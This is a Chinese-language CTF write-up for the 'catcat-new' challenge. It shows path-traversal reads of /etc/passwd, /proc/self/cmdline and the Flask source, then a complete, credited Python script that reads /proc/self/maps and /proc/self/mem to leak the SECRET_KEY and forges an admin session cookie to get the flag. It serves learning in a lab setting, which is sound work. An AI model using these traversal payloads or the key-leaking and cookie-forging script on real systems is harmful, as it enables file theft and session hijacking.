# catcat-new

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=9cc7514c-7c47-11ed-ab28-000c29bc20bf&task_category_id=3)

来到一个介绍猫的网站。每只猫的介绍文字可以点，比如第一只，点进去后会跳转到另一个界面，url非常可疑：

- http://61.147.171.105:60014/info?file=ForestCat.txt

判断可能有任意文件读取漏洞。如果一时半会不知道要读取什么，就先读linux系统都有的文件。翻出我的[笔记](../../../../笔记/Web/Web笔记.md)，之前做题时在第43条记了，第一个是/etc/passwd，好的就是你了。

- http://61.147.171.105:60014/info?file=../../../../../etc/passwd

发现读取成功，确定有漏洞。下一步是读取网站源码。在info界面抓个包，发现服务器是python。既然是python，当前进程肯定是由`python xxx.py`启动的，只要能知道当时的命令是什么，就能获取xxx.py的名字，进而读取源码。linux确实有这么个文件，`/proc/self/cmdline`，用于获取当前启动进程的完整命令。

- http://61.147.171.105:60014/info?file=../../../../../proc/self/cmdline
> b'python\x00app.py\x00'

如果是做题多的大佬估计都不用这一步，因为大部分的python网站脚本名都是app.py。路径我不太清楚，不过肯定不是当前路径，那就往上看，正好在上一个目录。

- http://61.147.171.105:60014/info?file=../app.py

```python
import os
import uuid
from flask import Flask, request, session, render_template, Markup
from cat import cat

flag = ""
app = Flask(
 __name__,
 static_url_path='/', 
 static_folder='static' 
)
app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh" #SECRET_KEY为uuid替换-为空后加上*abcdefgh。这里刻意的*abcdefgh是在提示我们secret key的格式
if os.path.isfile("/flag"):
 flag = cat("/flag")
 os.remove("/flag") #这里读取flag后删掉了flag，防止之前任意文件读取出非预期解

@app.route('/', methods=['GET'])
def index():
 detailtxt = os.listdir('./details/')
 cats_list = []
 for i in detailtxt:
 cats_list.append(i[:i.index('.')])
 
 return render_template("index.html", cats_list=cats_list, cat=cat)



@app.route('/info', methods=["GET", 'POST'])
def info():
 filename = "./details/" + request.args.get('file', "")
 start = request.args.get('start', "0")
 end = request.args.get('end', "0")
 name = request.args.get('file', "")[:request.args.get('file', "").index('.')]
 
 return render_template("detail.html", catname=name, info=cat(filename, start, end)) #cat是上面引用进来的函数
 


@app.route('/admin', methods=["GET"])
def admin_can_list_root():
 if session.get('admin') == 1: #session为admin就能得到flag，此处需要session伪造
 return flag
 else:
 session['admin'] = 0
 return "NoNoNo"



if __name__ == '__main__':
 app.run(host='0.0.0.0', debug=False, port=5637)
```

session伪造的必要条件是获取SECRET_KEY。到这里我不会了，后面看了[wp](https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#Cat-cat%F0%9F%98%BC)了解到了新的知识点——python存储对象的位置在堆上。app是个Flask对象，而secret key在app.config['SECRET_KEY']，读取/proc/self/mem得到进程的内存内容，进而获取到SECRET_KEY。不过读/proc/self/mem前要注意，/proc/self/mem内容较多而且存在不可读写部分，直接读取会导致程序崩溃，因此需要搭配/proc/self/maps获取堆栈分布，结合maps的映射信息来确定读的偏移值（参考[此处](https://www.jianshu.com/p/3fba2e5b1e17))。这里直接放出大佬读取/proc/self/maps+/proc/self/mem+SECRET_KEY的脚本，可一键获取flag。

```python
# coding=utf-8
#----------------------------------
###################################
#Edited by lx56@blog.lxscloud.top
###################################
#----------------------------------
import requests
import re
import ast, sys
from abc import ABC
from flask.sessions import SecureCookieSessionInterface


url = "http://61.147.171.105:60014/"

#此程序只能运行于Python3以上
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')

#----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ----------------
class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key
        
class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            #Encode a Flask session cookie
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e
#-------------------------------------------



#由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret key
s_key = ""
bypass = "../.."
#请求file路由进行读取
map_list = requests.get(url + f"info?file={bypass}/proc/self/maps")
map_list = map_list.text.split("\\n")
for i in map_list:
    #匹配指定格式的地址
    map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
    if map_addr:
        start = int(map_addr.group(1), 16)
        end = int(map_addr.group(2), 16)
        print("Found rw addr:", start, "-", end)
        
        #设置起始和结束位置并读取/proc/self/mem
        res = requests.get(f"{url}/info?file={bypass}/proc/self/mem&start={start}&end={end}")
        #用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey
        if "*abcdefgh" in res.text:
            #正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh
            secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", res.text)
            if secret_key:
                print("Secret Key:", secret_key[0])
                s_key = secret_key[0]
                break

#设置session中admin的值为1
data = '{"admin":1}'
#伪造session
headers = {
    "Cookie" : "session=" + FSCM.encode(s_key, data)
}
#请求admin路由
try:
    flag = requests.get(url + "admin", headers=headers)
    print("Flag is", flag.text)
except:
    print("Something error")
```

## Flag
> catctf{Catch_the_c4t_HaHa}